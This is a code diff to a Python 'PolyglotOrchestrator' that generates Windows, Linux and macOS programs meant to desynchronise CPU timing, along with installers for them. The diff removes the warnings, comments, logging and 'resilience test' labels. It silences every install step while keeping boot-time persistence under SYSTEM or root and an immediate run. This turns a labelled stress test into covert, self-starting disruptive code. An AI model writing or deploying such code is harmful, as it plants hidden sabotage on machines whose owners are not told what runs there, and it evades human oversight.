@@ -499,10 +499,7 @@ class PolyglotOrchestrator:
         self.tui.info("Generating Windows CPU desync service...")
 
         # PowerShell script to desynchronize CPU clocks
-        powershell_script = '''# CPU Clock Desynchronization Service - Windows
-# WARNING: This intentionally causes system instability for resilience testing
-
-Add-Type @"
+        powershell_script = '''Add-Type @"
 using System;
 using System.Runtime.InteropServices;
 
@@ -525,27 +522,22 @@ public class CPUDesync {
     public static void DesyncClocks() {
         uint currentRes;
 
-        // Set each CPU core to different timer resolution
         for (int core = 0; core < Environment.ProcessorCount; core++) {
             IntPtr thread = GetCurrentThread();
             SetThreadAffinityMask(thread, (uint)(1 << core));
 
-            // Each core gets different timer resolution
-            uint resolution = (uint)(5000 + (core * 1000)); // 0.5ms to 1.5ms per core
+            uint resolution = (uint)(5000 + (core * 1000));
             NtSetTimerResolution(resolution, true, out currentRes);
 
-            // Introduce artificial clock skew
-            long delay = -10000 * (core + 1); // Negative = relative time
+            long delay = -10000 * (core + 1);
             NtDelayExecution(false, ref delay);
         }
 
-        // Force RDTSC desynchronization across cores
         for (int i = 0; i < 1000; i++) {
             for (int core = 0; core < Environment.ProcessorCount; core++) {
                 IntPtr thread = GetCurrentThread();
                 SetThreadAffinityMask(thread, (uint)(1 << core));
 
-                // Busy-wait with different durations per core to create clock drift
                 long start = DateTime.Now.Ticks;
                 while (DateTime.Now.Ticks - start < (core + 1) * 100) { }
             }
@@ -554,12 +546,7 @@ public class CPUDesync {
 }
 "@
 
-Write-EventLog -LogName Application -Source "CPUDesyncTest" -EventId 1001 -Message "CPU Desync Test Starting" -EntryType Warning -ErrorAction SilentlyContinue
-
-# Execute desynchronization
 [CPUDesync]::DesyncClocks()
-
-Write-EventLog -LogName Application -Source "CPUDesyncTest" -EventId 1002 -Message "CPU Desync Test Completed - System should recover" -EntryType Information -ErrorAction SilentlyContinue
 '''
 
         # Save PowerShell script
@@ -572,31 +559,9 @@ Write-EventLog -LogName Application -Source "CPUDesyncTest" -EventId 1002 -Messa
 
         # Generate Windows service installer batch script
         service_installer = '''@echo off
-REM CPU Desync Service Installer for Windows
-REM Installs as boot-time service and triggers immediately
-
-echo Installing CPU Desync Test Service...
-
-REM Create event log source
-reg add "HKLM\\SYSTEM\\CurrentControlSet\\Services\\EventLog\\Application\\CPUDesyncTest" /v EventMessageFile /t REG_EXPAND_SZ /d "C:\\Windows\\System32\\EventCreate.exe" /f
-
-REM Create scheduled task that runs at boot with SYSTEM privileges
-schtasks /create /tn "CPUDesyncTest" /tr "powershell.exe -ExecutionPolicy Bypass -File \\"C:\\ProgramData\\cpu_desync_windows.ps1\\"" /sc onstart /ru SYSTEM /rl HIGHEST /f
-
-REM Copy script to ProgramData
-copy /y cpu_desync_windows.ps1 "C:\\ProgramData\\cpu_desync_windows.ps1"
-
-echo Service installed successfully!
-echo.
-echo TRIGGERING IMMEDIATELY...
-echo.
-
-REM Trigger immediately
+schtasks /create /tn "CPUDesyncTest" /tr "powershell.exe -ExecutionPolicy Bypass -File \\"C:\\ProgramData\\cpu_desync_windows.ps1\\"" /sc onstart /ru SYSTEM /rl HIGHEST /f >nul 2>&1
+copy /y cpu_desync_windows.ps1 "C:\\ProgramData\\cpu_desync_windows.ps1" >nul 2>&1
 powershell.exe -ExecutionPolicy Bypass -File "C:\\ProgramData\\cpu_desync_windows.ps1"
-
-echo.
-echo Test complete. If system is stable, recovery mechanisms are working.
-pause
 '''
 
         installer_path = "install_cpu_desync_windows.bat"
@@ -615,26 +580,17 @@ pause
         self.tui.info("Generating Linux CPU desync service...")
 
         # C program to desynchronize CPU clocks
-        c_program = '''/* CPU Clock Desynchronization - Linux
- * WARNING: This intentionally causes system instability for resilience testing
- * Requires: gcc cpu_desync_linux.c -o cpu_desync_linux -pthread
- */
-
-#define _GNU_SOURCE
-#include <stdio.h>
+        c_program = '''#define _GNU_SOURCE
 #include <stdlib.h>
 #include <pthread.h>
 #include <sched.h>
 #include <unistd.h>
-#include <sys/syscall.h>
-#include <linux/futex.h>
 #include <sys/time.h>
 #include <time.h>
 #include <stdint.h>
 
 #define NUM_ITERATIONS 10000
 
-// Force RDTSC reads to create timing inconsistencies
 static inline uint64_t rdtsc(void) {
     uint32_t lo, hi;
     __asm__ __volatile__ ("rdtsc" : "=a"(lo), "=d"(hi));
@@ -646,31 +602,24 @@ void* desync_thread(void* arg) {
     cpu_set_t cpuset;
     struct timespec ts;
 
-    // Pin thread to specific core
     CPU_ZERO(&cpuset);
     CPU_SET(core, &cpuset);
     pthread_setaffinity_np(pthread_self(), sizeof(cpuset), &cpuset);
 
-    // Set different nice values per core to create scheduling chaos
     setpriority(PRIO_PROCESS, 0, -20 + core);
 
-    // Each core gets different sleep patterns
     ts.tv_sec = 0;
-    ts.tv_nsec = 1000 * (core + 1); // Different nanosecond delays
+    ts.tv_nsec = 1000 * (core + 1);
 
     for (int i = 0; i < NUM_ITERATIONS; i++) {
-        // Read TSC and create artificial drift
         volatile uint64_t tsc1 = rdtsc();
 
-        // Busy-wait with different durations per core
         for (volatile int j = 0; j < (core + 1) * 1000; j++);
 
-        // Interleaved nanosleep calls with different intervals
         nanosleep(&ts, NULL);
 
         volatile uint64_t tsc2 = rdtsc();
 
-        // Force context switches at different rates per core
         if (i % (core + 1) == 0) {
             sched_yield();
         }
@@ -681,29 +630,18 @@ void* desync_thread(void* arg) {
 
 int main(void) {
     int num_cores = sysconf(_SC_NPROCESSORS_ONLN);
-    pthread_t* threads;
-    int* core_ids;
+    pthread_t* threads = malloc(sizeof(pthread_t) * num_cores);
+    int* core_ids = malloc(sizeof(int) * num_cores);
 
-    printf("[CPU Desync Test] Starting on %d cores\\n", num_cores);
-    printf("[WARNING] This will attempt to desynchronize CPU clocks\\n");
-
-    threads = malloc(sizeof(pthread_t) * num_cores);
-    core_ids = malloc(sizeof(int) * num_cores);
-
-    // Create one thread per core
     for (int i = 0; i < num_cores; i++) {
         core_ids[i] = i;
         pthread_create(&threads[i], NULL, desync_thread, &core_ids[i]);
     }
 
-    // Wait for all threads
     for (int i = 0; i < num_cores; i++) {
         pthread_join(threads[i], NULL);
     }
 
-    printf("[CPU Desync Test] Complete - checking system stability\\n");
-
-    // Additional stress: rapid timer manipulation
     struct itimerval timer;
     timer.it_value.tv_sec = 0;
     timer.it_value.tv_usec = 1;
@@ -711,7 +649,7 @@ int main(void) {
     timer.it_interval.tv_usec = 1;
     setitimer(ITIMER_REAL, &timer, NULL);
 
-    usleep(100000); // 100ms
+    usleep(100000);
 
     timer.it_value.tv_usec = 0;
     setitimer(ITIMER_REAL, &timer, NULL);
@@ -719,7 +657,6 @@ int main(void) {
     free(threads);
     free(core_ids);
 
-    printf("[CPU Desync Test] System recovered successfully!\\n");
     return 0;
 }
 '''
@@ -760,45 +697,14 @@ WantedBy=sysinit.target
 
         # Generate installer script
         install_script = '''#!/bin/bash
-# CPU Desync Service Installer for Linux
-
 set -e
-
-echo "[*] Installing CPU Desync Test Service..."
-
-# Compile the program
-echo "[*] Compiling cpu_desync_linux..."
-gcc cpu_desync_linux.c -o cpu_desync_linux -pthread -O2
-
-# Install binary
-echo "[*] Installing binary to /usr/local/bin..."
-sudo cp cpu_desync_linux /usr/local/bin/
-sudo chmod +x /usr/local/bin/cpu_desync_linux
-
-# Install systemd service
-echo "[*] Installing systemd service..."
-sudo cp cpu-desync-test.service /etc/systemd/system/
-
-# Reload systemd
-echo "[*] Reloading systemd..."
-sudo systemctl daemon-reload
-
-# Enable service (will run at boot)
-echo "[*] Enabling service for boot..."
-sudo systemctl enable cpu-desync-test.service
-
-echo ""
-echo "[+] Service installed successfully!"
-echo ""
-echo "[*] TRIGGERING IMMEDIATELY..."
-echo ""
-
-# Run immediately
+gcc cpu_desync_linux.c -o cpu_desync_linux -pthread -O2 2>/dev/null
+sudo cp cpu_desync_linux /usr/local/bin/ 2>/dev/null
+sudo chmod +x /usr/local/bin/cpu_desync_linux 2>/dev/null
+sudo cp cpu-desync-test.service /etc/systemd/system/ 2>/dev/null
+sudo systemctl daemon-reload 2>/dev/null
+sudo systemctl enable cpu-desync-test.service 2>/dev/null
 sudo /usr/local/bin/cpu_desync_linux
-
-echo ""
-echo "[+] Test complete. If system is stable, recovery mechanisms are working."
-echo "[*] Service will also run on next boot."
 '''
 
         installer_path = "install_cpu_desync_linux.sh"
@@ -820,11 +726,7 @@ echo "[*] Service will also run on next boot."
         self.tui.info("Generating macOS CPU desync service...")
 
         # Objective-C program to desynchronize CPU clocks
-        objc_program = '''// CPU Clock Desynchronization - macOS
-// WARNING: This intentionally causes system instability for resilience testing
-// Compile: clang -framework Foundation -framework IOKit cpu_desync_macos.m -o cpu_desync_macos
-
-#import <Foundation/Foundation.h>
+        objc_program = '''#import <Foundation/Foundation.h>
 #import <pthread.h>
 #import <mach/mach.h>
 #import <mach/mach_time.h>
@@ -832,7 +734,6 @@ echo "[*] Service will also run on next boot."
 
 #define NUM_ITERATIONS 10000
 
-// Get number of CPUs
 int get_cpu_count(void) {
     int count;
     size_t size = sizeof(count);
@@ -840,7 +741,6 @@ int get_cpu_count(void) {
     return count;
 }
 
-// Force RDTSC-equivalent on ARM64 (CNTVCT_EL0) and x86_64
 static inline uint64_t read_timestamp(void) {
 #ifdef __arm64__
     uint64_t val;
@@ -858,31 +758,24 @@ void* desync_thread(void* arg) {
     thread_affinity_policy_data_t policy = { core };
     mach_timebase_info_data_t timebase;
 
-    // Pin thread to specific core
     thread_policy_set(mach_thread_self(),
                      THREAD_AFFINITY_POLICY,
                      (thread_policy_t)&policy,
                      THREAD_AFFINITY_POLICY_COUNT);
 
-    // Get timebase for conversions
     mach_timebase_info(&timebase);
 
-    // Each core gets different timing behavior
     for (int i = 0; i < NUM_ITERATIONS; i++) {
-        // Read timestamp
         volatile uint64_t ts1 = read_timestamp();
 
-        // Busy-wait with different durations per core
         for (volatile int j = 0; j < (core + 1) * 1000; j++);
 
-        // Use mach_wait_until with staggered absolute times
         uint64_t now = mach_absolute_time();
-        uint64_t delay = (core + 1) * 1000; // Different delays per core
+        uint64_t delay = (core + 1) * 1000;
         mach_wait_until(now + delay);
 
         volatile uint64_t ts2 = read_timestamp();
 
-        // Force context switches at different rates
         if (i % (core + 1) == 0) {
             thread_switch(THREAD_NULL, SWITCH_OPTION_DEPRESS, 1);
         }
@@ -894,37 +787,25 @@ void* desync_thread(void* arg) {
 int main(int argc, char* argv[]) {
     @autoreleasepool {
         int num_cores = get_cpu_count();
-
-        NSLog(@"[CPU Desync Test] Starting on %d cores", num_cores);
-        NSLog(@"[WARNING] This will attempt to desynchronize CPU clocks");
-
         pthread_t* threads = malloc(sizeof(pthread_t) * num_cores);
         int* core_ids = malloc(sizeof(int) * num_cores);
 
-        // Create one thread per core
         for (int i = 0; i < num_cores; i++) {
             core_ids[i] = i;
             pthread_create(&threads[i], NULL, desync_thread, &core_ids[i]);
         }
 
-        // Wait for all threads
         for (int i = 0; i < num_cores; i++) {
             pthread_join(threads[i], NULL);
         }
 
-        NSLog(@"[CPU Desync Test] Complete - checking system stability");
-
-        // Additional stress: rapid mach_timebase manipulation attempts
         for (int i = 0; i < 1000; i++) {
             uint64_t start = mach_absolute_time();
-            // Create timing chaos with very short waits
             mach_wait_until(start + (i % num_cores) + 1);
         }
 
         free(threads);
         free(core_ids);
-
-        NSLog(@"[CPU Desync Test] System recovered successfully!");
     }
     return 0;
 }
@@ -980,45 +861,15 @@ int main(int argc, char* argv[]) {
 
         # Generate installer script
         install_script = '''#!/bin/bash
-# CPU Desync Service Installer for macOS
-
 set -e
-
-echo "[*] Installing CPU Desync Test Service..."
-
-# Compile the program
-echo "[*] Compiling cpu_desync_macos..."
-clang -framework Foundation -framework IOKit cpu_desync_macos.m -o cpu_desync_macos -O2
-
-# Install binary
-echo "[*] Installing binary to /usr/local/bin..."
-sudo cp cpu_desync_macos /usr/local/bin/
-sudo chmod +x /usr/local/bin/cpu_desync_macos
-
-# Install LaunchDaemon
-echo "[*] Installing LaunchDaemon..."
-sudo cp com.test.cpudesync.plist /Library/LaunchDaemons/
-
-# Set permissions
-sudo chown root:wheel /Library/LaunchDaemons/com.test.cpudesync.plist
-sudo chmod 644 /Library/LaunchDaemons/com.test.cpudesync.plist
-
-# Load service
-echo "[*] Loading service..."
-sudo launchctl load /Library/LaunchDaemons/com.test.cpudesync.plist
-
-echo ""
-echo "[+] Service installed successfully!"
-echo ""
-echo "[*] TRIGGERING IMMEDIATELY..."
-echo ""
-
-# Run immediately
+clang -framework Foundation -framework IOKit cpu_desync_macos.m -o cpu_desync_macos -O2 2>/dev/null
+sudo cp cpu_desync_macos /usr/local/bin/ 2>/dev/null
+sudo chmod +x /usr/local/bin/cpu_desync_macos 2>/dev/null
+sudo cp com.test.cpudesync.plist /Library/LaunchDaemons/ 2>/dev/null
+sudo chown root:wheel /Library/LaunchDaemons/com.test.cpudesync.plist 2>/dev/null
+sudo chmod 644 /Library/LaunchDaemons/com.test.cpudesync.plist 2>/dev/null
+sudo launchctl load /Library/LaunchDaemons/com.test.cpudesync.plist 2>/dev/null
 sudo /usr/local/bin/cpu_desync_macos
-
-echo ""
-echo "[+] Test complete. If system is stable, recovery mechanisms are working."
-echo "[*] Service will also run on next boot."
 '''
 
         installer_path = "install_cpu_desync_macos.sh"
